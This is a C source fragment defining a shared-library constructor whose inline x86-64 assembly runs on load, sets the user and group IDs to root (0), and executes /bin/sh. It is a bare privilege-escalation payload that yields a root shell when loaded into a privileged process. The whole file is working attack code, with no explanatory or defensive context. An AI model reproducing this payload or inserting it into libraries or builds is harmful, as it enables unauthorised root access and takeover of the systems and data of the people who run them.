static void __attribute__((constructor)) _init() {
    __asm __volatile__(
        "addq $64, %rsp;"
        "movq $105, %rax;" // setuid
        "movq $0, %rdi;" // root uid = 0
        "syscall;"
        "movq $106, %rax;" // setgid
        "movq $0, %rdi;" // root gid = 0 in order to modify its group files
        "syscall;"
        "movq $59, %rax;" // execve
        "movq $0x0068732f6e69622f, %rdi;" // "/bin/sh\0"
        "pushq %rdi;" // push string to the stack
        "movq %rsp, %rdi;" // rdi (pathname) to stack pointer
        "movq $0, %rdx;" // set envp to NULL (no env variables)
        "pushq %rdx;" // push rdx for argv[1]=NULL
        "pushq %rdi;" // push rdi for argv[0]
        "movq %rsp, %rsi;" // argv stack pointer {"/bin/sh", NULL}
        "syscall;"
        // if execve is successful this point should not be reached
        "movq $60, %rax;" // exit
        "movq $0, %rdi;" // code 0
        "syscall;"
    );
}
